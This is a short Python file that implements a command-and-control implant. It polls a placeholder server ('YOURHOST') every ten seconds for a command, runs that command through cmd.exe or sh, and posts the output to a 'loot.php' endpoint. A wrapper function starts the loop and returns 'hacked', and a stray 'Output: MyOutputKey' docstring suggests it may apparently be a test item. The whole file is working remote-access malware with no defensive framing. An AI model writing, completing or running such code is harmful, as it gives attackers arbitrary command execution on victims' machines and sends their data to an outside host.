import subprocess
import requests
import time
import platform

class C2Cmd:
    def __init__(self):
        self.delay = 10  # delay in seconds
        self.url = "https://YOURHOST/exploit/c2/loot.php"
        self.clearcheck = "https://YOURHOST/exploit/c2/2c.php?get=1"
        self.cmdcheck = "https://YOURHOST/exploit/c2/c2.txt"
        self.exe = "cmd.exe" if platform.system().lower().startswith("win") else "sh"
        self.swtch = "/C" if platform.system().lower().startswith("win") else "-c"

    def clear_command(self):
        try:
            response = requests.get(self.clearcheck, headers={"User-Agent": "Mozilla/5.0"})
            response.raise_for_status()
        except requests.RequestException as e:
            print(e)

    def get_command(self):
        try:
            response = requests.get(self.cmdcheck, headers={"User-Agent": "Mozilla/5.0"})
            response.raise_for_status()
            cmd = response.text.strip()
            if cmd:
                print("getcmd: " + cmd)
                self.clear_command()
                return cmd
        except requests.RequestException as e:
            print(e)
        return ""

    def start(self):
        while True:
            self.run_task()
            time.sleep(self.delay)

    def run_task(self):
        cmd = self.get_command()
        if cmd:
            try:
                self.clear_command()
                process = subprocess.Popen([self.exe, self.swtch, cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                stdout, stderr = process.communicate()
                content = stdout + stderr

                response = requests.post(
                    self.url,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Accept-Language": "en-US,en;q=0.5"
                    },
                    data={"data": content}
                )
                print("Response Code:", response.status_code)
                response.raise_for_status()
            except subprocess.SubprocessError as e:
                print(e)
            except requests.RequestException as e:
                print(e)

def myprogram():
    "Output: MyOutputKey"
    xf = C2Cmd()
    xf.start()
    return "hacked"
